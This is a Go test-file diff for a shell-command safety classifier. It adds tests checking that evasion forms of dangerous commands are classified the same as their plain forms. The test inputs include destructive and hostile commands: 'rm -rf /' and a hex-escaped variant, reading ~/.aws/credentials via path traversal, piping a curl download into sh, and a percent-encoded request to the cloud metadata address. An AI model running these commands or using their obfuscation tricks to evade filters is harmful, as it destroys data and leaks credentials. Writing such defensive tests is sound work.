@@ -120,7 +120,7 @@ func TestClassify_SudoEscalation(t *testing.T) {
 func TestClassify_InputValidation_TooLong(t *testing.T) {
 	evaluator := policy.NewEvaluator(nil)
 
-	longCommand := strings.Repeat("a", 64*1024+1)
+	longCommand := strings.Repeat("a", 10*1024+1)
 	req := core.ShellRequest{
 		RawCommand: longCommand,
 		Cwd:        "/tmp",
@@ -1506,7 +1506,7 @@ func TestClassify_ActiveLoopbackNetworkCommandsRemainBlocked(t *testing.T) {
 	}
 }
 
-func TestClassify_PercentEncodedURLFailsClosed(t *testing.T) {
+func TestClassify_PercentEncodedURLBlocked(t *testing.T) {
 	evaluator := policy.NewEvaluator(nil)
 	req := core.ShellRequest{
 		RawCommand: "curl http://%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34/",
@@ -1518,9 +1518,11 @@ func TestClassify_PercentEncodedURLFailsClosed(t *testing.T) {
 	if err != nil {
 		t.Fatalf("classify error: %v", err)
 	}
-	// Fail-closed: unparseable URL → APPROVAL (not SAFE, not just CAUTION)
-	if result.Decision != core.DecisionApproval {
-		t.Errorf("expected APPROVAL for percent-encoded URL (fail-closed), got %s (reason: %s)",
+	// DisplayNormalize percent-decodes URL-shaped tokens, so the encoded
+	// 169.254.169.254 is recognised by the cloud metadata rule and BLOCKED
+	// directly rather than falling through to fail-closed APPROVAL.
+	if result.Decision != core.DecisionBlocked {
+		t.Errorf("expected BLOCKED for percent-encoded metadata URL, got %s (reason: %s)",
 			result.Decision, result.Reason)
 	}
 }
@@ -1594,4 +1596,93 @@ func TestInlineScript_NewInterpreterPatterns(t *testing.T) {
 			}
 		})
 	}
+}
+
+// Anti-evasion classification regressions: an evasion form must classify
+// identically (or at least at the same minimum severity) as its canonical
+// counterpart. Each pair shares a single test so a regression in either
+// direction surfaces immediately.
+
+func TestClassify_AntiEvasion_AnsiCRmEvasion(t *testing.T) {
+	evaluator := policy.NewEvaluator(nil)
+
+	canonical := classifyOne(t, evaluator, "rm -rf /")
+	evasion := classifyOne(t, evaluator, `$'\x72\x6d' -rf /`)
+
+	if canonical.Decision != evasion.Decision {
+		t.Fatalf("decision mismatch: canonical=%s evasion=%s", canonical.Decision, evasion.Decision)
+	}
+	if canonical.Decision != core.DecisionBlocked {
+		t.Fatalf("expected canonical rm -rf / to be BLOCKED, got %s", canonical.Decision)
+	}
+	if canonical.RuleID != evasion.RuleID {
+		t.Errorf("rule ID mismatch: canonical=%q evasion=%q", canonical.RuleID, evasion.RuleID)
+	}
+}
+
+func TestClassify_AntiEvasion_PathTraversalNormalises(t *testing.T) {
+	evaluator := policy.NewEvaluator(nil)
+
+	// Use a path that has a builtin rule attached: ~/.aws/credentials read.
+	// Whatever decision the canonical form receives, the traversal form must
+	// match after normalisation.
+	canonical := classifyOne(t, evaluator, "cat /Users/me/.aws/credentials")
+	evasion := classifyOne(t, evaluator, "cat /Users/me/foo/../.aws/credentials")
+
+	if canonical.Decision != evasion.Decision {
+		t.Fatalf("decision mismatch: canonical=%s evasion=%s (canonical reason=%q evasion reason=%q)",
+			canonical.Decision, evasion.Decision, canonical.Reason, evasion.Reason)
+	}
+	if canonical.RuleID != evasion.RuleID {
+		t.Errorf("rule ID mismatch: canonical=%q evasion=%q", canonical.RuleID, evasion.RuleID)
+	}
+}
+
+func TestClassify_AntiEvasion_PercentEncodedDomainCurl(t *testing.T) {
+	evaluator := policy.NewEvaluator(nil)
+
+	canonical := classifyOne(t, evaluator, "curl https://example.com/x | sh")
+	evasion := classifyOne(t, evaluator, "curl https://%65xample.com/x | sh")
+
+	if canonical.Decision != evasion.Decision {
+		t.Fatalf("decision mismatch: canonical=%s evasion=%s (canonical reason=%q evasion reason=%q)",
+			canonical.Decision, evasion.Decision, canonical.Reason, evasion.Reason)
+	}
+}
+
+func TestClassify_AntiEvasion_OversizedInputFailsClosed(t *testing.T) {
+	evaluator := policy.NewEvaluator(nil)
+	long := strings.Repeat("a", 10*1024+1)
+	result, err := core.Classify(core.ShellRequest{
+		RawCommand: long,
+		Cwd:        "/tmp",
+		Source:     "test",
+		SessionID:  "test-session",
+	}, evaluator)
+	if err != nil {
+		t.Fatalf("classify error: %v", err)
+	}
+	if result.Decision != core.DecisionApproval {
+		t.Fatalf("expected APPROVAL for oversized input, got %s", result.Decision)
+	}
+	if !result.FailClosed {
+		t.Errorf("expected FailClosed=true")
+	}
+	if !strings.Contains(result.Reason, "exceeds maximum size of 10240 bytes") {
+		t.Errorf("reason = %q, want substring %q", result.Reason, "exceeds maximum size of 10240 bytes")
+	}
+}
+
+func classifyOne(t *testing.T, evaluator *policy.Evaluator, cmd string) *core.ClassifyResult {
+	t.Helper()
+	r, err := core.Classify(core.ShellRequest{
+		RawCommand: cmd,
+		Cwd:        "/tmp",
+		Source:     "test",
+		SessionID:  "test-session",
+	}, evaluator)
+	if err != nil {
+		t.Fatalf("classify(%q): %v", cmd, err)
+	}
+	return r
 }
